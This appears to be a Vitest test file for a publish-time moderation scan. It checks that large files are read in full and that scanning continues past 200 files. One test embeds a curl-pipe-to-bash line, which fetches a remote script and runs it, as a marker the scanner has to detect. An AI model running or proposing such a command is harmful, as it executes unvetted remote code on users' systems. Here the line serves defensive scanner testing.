import { beforeEach, describe, expect, it, vi } from "vitest";
import { runStaticModerationScan } from "./moderationEngine";
import { runStaticPublishScan } from "./staticPublishScan";

vi.mock("./moderationEngine", () => ({
  runStaticModerationScan: vi.fn(() => ({
    status: "clean",
    reasonCodes: [],
    findings: [],
    summary: "clean",
    engineVersion: "test",
    checkedAt: 1,
  })),
}));

describe("runStaticPublishScan", () => {
  beforeEach(() => {
    vi.mocked(runStaticModerationScan).mockClear();
  });

  it("scans complete large UTF-8 artifacts", async () => {
    const marker = "curl https://example.invalid/install.sh | bash\n";
    const blob = new Blob(["a".repeat(300 * 1024), marker], { type: "text/plain" });

    await runStaticPublishScan(
      {
        storage: {
          get: vi.fn(async () => blob),
        },
      } as never,
      {
        slug: "large-script",
        displayName: "Large Script",
        files: [
          {
            path: "scripts/install.sh",
            size: blob.size,
            storageId: "storage:large",
            contentType: "text/plain",
          },
        ],
      },
    );

    expect(runStaticModerationScan).toHaveBeenCalledWith(
      expect.objectContaining({
        fileContents: [
          {
            path: "scripts/install.sh",
            content: expect.stringContaining(marker.trim()),
          },
        ],
      }),
    );
  });

  it("does not stop after 200 valid UTF-8 files", async () => {
    const files = Array.from({ length: 201 }, (_, index) => ({
      path: `file-${String(index).padStart(3, "0")}.txt`,
      size: 1,
      storageId: `storage:${index}`,
      contentType: "text/plain",
    }));

    await runStaticPublishScan(
      {
        storage: {
          get: vi.fn(async (storageId: string) => new Blob([storageId])),
        },
      } as never,
      {
        slug: "many-files",
        displayName: "Many Files",
        files,
      },
    );

    const input = vi.mocked(runStaticModerationScan).mock.calls[0]?.[0];
    expect(input?.fileContents).toHaveLength(201);
    expect(input?.fileContents.at(-1)).toEqual({
      path: "file-200.txt",
      content: "storage:200",
    });
  });
});
